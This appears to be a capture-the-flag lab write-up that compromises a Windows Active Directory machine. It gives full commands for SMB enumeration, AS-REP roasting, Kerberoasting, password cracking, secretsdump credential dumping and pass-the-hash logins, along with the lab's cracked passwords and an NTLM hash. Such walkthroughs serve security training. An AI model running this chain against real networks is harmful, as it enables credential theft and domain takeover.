---
layout: post
author: Fr4nSec
tags: [Windows, SMB,]
---

## Objectives

- Obtain the user flag
- Obtain the system flag (root)

## Recon

Let's scan the target IP address..

```
nmap -p- -sS --min-rate 5000 -n -Pn 10.10.216.196
```
![scan1](/images/scan1.jpg)

Once we have a list of open ports, let's scan those ports more in depth.

```
nmap -p 53,135,139,389,445,464,636,3268,5985,9389 -sCV 10.10.216.196 > PortScan
cat PortScan
```

![scan2](/images/scan2.jpg)

We can see some information like domain name and the host.

- Domain: vulnnet-rst.local0
- Host: WIN-2BO8M1OE1M1

Port 445 (SMB) is open. Let's see what we can retrieve from there.

```
smbmap -H 10.10.216.196 -u anonymous
```

![smb1](/images/smb1.jpg)




## Exploitation

IPC$ seems to be readable. That means we might be able to ennumerate names of domain accounts. Let's try:

```
impacket-lookupsid anonymous@10.10.216.196
```

![smb2](/images/smb2.jpg)

We can see some user names, let's strip out the data we don't need. Copy the result to a file and run the below to keep only the user names.

```
cat fullinfo.txt | grep SidTypeUser | awk -F'\' '{print $2}' | awk -F'(' '{print $1}'
```

![users1](/images/users.jpg)

Now, having a list of users, let's try to harvest AS_REP responses to see if we can get a hash. (The IP changed because i had to restart the target machine).

```
impacket-GetNPUsers 'VULNNET-RST/' -usersfile users.txt -no-pass -dc-ip 10.10.171.250
```
![hash1](/images/hash1.jpg)

We obtained the hash for the user t-skid. We can try brute force it:

```
john hash1 --wordlist=/home/kali/rockyou.txt 
```

![crackedhash](/images/crackedhash.jpg)

Now let's try to find some SPN associated with user accounts. Result should be a file with encrypted password(s).

```
impacket-GetUserSPNs 'VULNNET-RST.local/t-skid:tj072889*' -outputfile hashes -dc-ip 10.10.171.250 
```

![GetUserSPNs](/images/SPN.jpg)

![hash2](/images/hash2.jpg)

Now we can try crack it the same way as before:

![cracked2](/images/cracked2.jpg)

We have now the cracked password for the account **'enterprise-core-vn'**. Let's attempt a remote connection:

```
evil-winrm -i 10.10.171.250 -u 'enterprise-core-vn' -p 'ry=ibfkfv,s6h,' 
```

![remote](/images/remote.jpg)

It worked! Let's try find the flag. Usually is in the same folder or near.

![flag1](/images/flag1.jpg)

And we got the first flag. 

Now let's map the SMB again but this time with a valid user.

```
smbmap -H 10.10.171.250 -u enterprise-core-vn -p 'ry=ibfkfv,s6h,'
```

![smb3](/images/smb3.jpg)

We get shares that are now readable. Let's dig more.

```
smbclient \\\\10.10.171.250\\SYSVOL -U 'enterprise-core-vn%ry=ibfkfv,s6h,'
```

![sysvol](/images/sysvol.jpg)

We found some interesting folders. Let's dig.

![scripts](/images/script.jpg)

We found a script and when we check what does it do, we find some credentials for user **a-whitehat**!

![scriptcreds](/images/scripcreds.jpg)



## Privilege escalation

Let's try to connect:

```
evil-winrm -i 10.10.31.71 -u 'a-whitehat' -p 'bNdKVkjv3RR9ht'
```

It works! and if we run the below, we see the user is DOMAIN ADMIN!

![domainadmin](/images/domainadmin.jpg)

I found the system.txt within 'C:\Users\Administrator\Desktop', but the file itself is not readable by the user. We can use secretsdump to try dumping the Administrator account.

```
impacket-secretsdump VULNNET-RST.local/a-whitehat:bNdKVkjv3RR9ht@10.10.31.71
```

We found all hashes but what we really want is the Administrator one that we got here.

![admin](/images/admin.jpg)

We don't need to crack the hash, we can just use it with Evil-WinRM:

```
evil-winrm -i 10.10.31.71 -u 'Administrator' -H 'c2597747aa5e43022a3a3049a3c3b09d'
```

It worked! And now we can read the system.txt file to grab the system flag.

![root](/images/root.jpg)
